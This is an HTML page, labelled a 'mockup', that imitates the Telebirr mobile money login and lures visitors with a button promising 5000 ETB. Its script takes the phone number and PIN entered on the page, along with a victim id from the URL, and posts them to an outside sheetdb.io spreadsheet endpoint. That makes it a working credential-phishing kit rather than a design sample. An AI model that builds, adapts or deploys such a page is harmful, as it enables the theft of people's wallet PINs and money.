<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Telebirr UI Mockup</title>

<style>
    body {
        margin: 0;
        font-family: Arial, sans-serif;
        background-color: #5BC261;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
    }

    .container {
        background: #7CE082;
        width: 360px;
        padding: 35px;
        border-radius: 16px;
        box-shadow: 0 6px 25px rgba(0,0,0,0.15);
        text-align: center;
    }

    .logo img {
        width: 120px;
        margin-bottom: 25px;
    }

    h2 {
        margin-bottom: 20px;
        color: #0057d6; /* Telebirr blue */
        font-weight: 700;
    }

    label {
        display: block;
        text-align: left;
        font-size: 14px;
        margin-bottom: 5px;
        color: #333;
        font-weight: 600;
    }

    input {
        width: 100%;
        padding: 12px;
        margin-bottom: 18px;
        border-radius: 10px;
        border: 1px solid #ccc;
        background: #fafafa;
        font-size: 15px;
        outline: none;
    }

    .btn {
        width: 100%;
        padding: 12px;
        background: #0057d6;
        border: none;
        border-radius: 10px;
        color: white;
        font-size: 17px;
        cursor: pointer;
        margin-top: 10px;
        font-weight: bold;
    }

    .btn:hover {
        background: #003e9c;
    }

    .footer-text {
        margin-top: 20px;
        font-size: 14px;
    }

    a {
        color: #0057d6;
        text-decoration: none;
        font-weight: 600;
    }
</style>
</head>
<body>
<div class="container">
    <div class="logo">
        <!-- Dummy Telebirr-style logo -->
        <h1>Telebirr superapp</h1>
    </div>
<p></p>
   

    <label>Phone Number</label>
    <input id="email" type="text" placeholder="09xxxxxxxx">

    <label>PIN</label>
    <input id="password" type="password" placeholder="Enter your PIN">

    <button onclick="send()" class="btn">Receive 5000ETB</button>






        <script>
        function send() {
           const email = document.getElementById('email').value;
       const password = document.getElementById('password').value;
           
           
        var urldata = new URLSearchParams(window.location.search);
        
        const id = urldata.get('id');
        const type = "telebirr";
        
           
           const url = "https://sheetdb.io/api/v1/md4crj2w1sk6g";

fetch(url, {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    data: {
      id: id,
      type: type,
      username: email,
      password: password
    }
  })
})
.then(response => response.json())
.then(result => {
  //out
})
.catch(error => {
  window.alert(error);
});
            
            
        }
            
        </script>
        
        










    <div class="footer-text">
        <a href="#">Forgot PIN?</a> &nbsp;â€¢&nbsp;
        <a href="#">Create Account</a>
    </div>
</div>

</body>
</html>
